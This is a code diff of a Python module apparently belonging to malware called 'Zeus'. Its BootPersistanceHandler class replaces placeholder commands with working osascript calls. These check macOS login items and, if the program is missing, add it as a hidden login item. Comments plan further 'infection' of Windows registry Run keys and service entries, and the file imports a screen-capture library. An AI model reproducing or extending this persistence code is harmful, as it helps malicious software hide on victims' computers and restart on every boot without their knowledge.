@@ -2,6 +2,8 @@ import platform
 import os
 import os.path
 import subprocess
+import Zeus
+
 from shutil import copy
 
 from PIL import ImageGrab
@@ -17,9 +19,10 @@ except ImportError:
     except ImportError:
         winreg = None
 
-# TODO: Change to WindowsBootPersistManager class
 # TODO: Explore infection to: "SYSTEM\CurrentControlSet\Services\Zeus" - load before many service applications and drivers
 # TODO: Explore infection to: "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
+
+ZEUS_FULL_PATH = Zeus.__file__
 
 class BootPersistanceHandler:
 
@@ -62,7 +65,7 @@ class BootPersistanceHandler:
             print("We're on Linux...")
         elif (platform.system().lower() == "darwin"):
             print("We're on Mac OS X...")
-            
+
             self.infectMacSystem()
 
     #
@@ -198,16 +201,25 @@ class BootPersistanceHandler:
         # 1. Check if not infected
         # 2. If it is not then infect via AppleScript to Login startup items
 
-        infectCommandToCheck = r"defaults write loginwindow AutoLaunchedApplicationDictionary -array-add '{ \"Path\" = \"/path/to/itemname\"; \"Hide\" = 0; }'"
+        fileName = os.path.basename(ZEUS_FULL_PATH)
+        fileNameWithoutExtension = fileName.split(".")
+        fileNameWithoutExtension = fileNameWithoutExtension[0]
+
+        listCommand = "osascript -e 'tell application \"System Events\" to get the name of every login item'"
+        infectCommand = "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"%s\", hidden:true}'" % ZEUS_FULL_PATH
+        # removeCommand = "osascript -e 'tell application \"System Events\" to delete login item \"%s\"'" % fileName
 
 
-        infectCommand = r"osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/path/to/itemname\", hidden:false}'"
-        removeCommand = r"osascript -e 'tell application \"System Events\" to delete login item \"itemname\"'"
-        listCommand = r"osascript -e 'tell application \"System Events\" to get the name of every login item'"
+        try:
+            results = subprocess.check_output(listCommand, shell=True).decode('utf-8')
+            print(results)
 
-        command = "osascript -e 'display dialog \"Hello from osxdaily.com\" with title \"Hello\"'"
-        results = subprocess.check_output(command, shell=True).decode('utf-8')
-        print(results)
+            if fileNameWithoutExtension not in results:
+                results = subprocess.check_output(infectCommand, shell=True).decode('utf-8')
+                print(results)
+        except subprocess.CalledProcessError as error:
+            print(error)
+
 
     #
     # Start here
